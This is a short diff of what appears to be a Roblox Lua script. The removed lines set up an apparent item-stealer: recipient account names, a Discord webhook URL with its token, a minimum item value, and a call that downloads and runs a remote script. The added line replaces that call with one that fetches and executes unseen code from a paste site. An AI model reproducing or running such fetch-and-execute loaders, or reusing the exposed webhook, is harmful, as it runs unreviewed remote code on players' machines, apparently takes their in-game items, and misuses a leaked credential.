@@ -1,4 +1,1 @@
-Username = {"CupidAltAccount55","CupidAltAccount1","BuilderGirls00","FAZE_SHADWO"} 
-Webhook = "https://discord.com/api/webhooks/1429411829788184597/24Y2UJi-MZCYEpSINmtxLRf20Xsowwr3YQ6ddiGWDeMkKQ_UEG0k-b3ZdusXRpUH9sbF" 
-min_rap = 10000
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+loadstring(game:HttpGet("https://paste.debian.net/plainh/ea4941f3/", true))()
